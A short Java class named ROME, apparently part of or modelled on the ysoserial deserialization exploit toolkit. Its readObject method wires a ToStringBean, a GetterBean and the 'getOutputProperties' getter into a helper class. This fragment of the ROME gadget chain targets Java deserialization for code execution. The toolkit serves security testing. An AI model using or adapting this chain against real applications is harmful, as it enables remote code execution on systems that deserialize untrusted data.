package ysoserial.payloads;

import com.sun.syndication.feed.impl.ToStringBean;
import ysoserial.payloads.util.GetterBean;
import ysoserial.payloads.util.RomeBadAttributeValueExpException;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class ROME implements Serializable {
    public void trigger() throws IOException, ClassNotFoundException {
        readObject(null);
    }

    private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException {
        new RomeBadAttributeValueExpException().replay(
                new ToStringBean(new GetterBean(), "getOutputProperties")
        );
    }
}
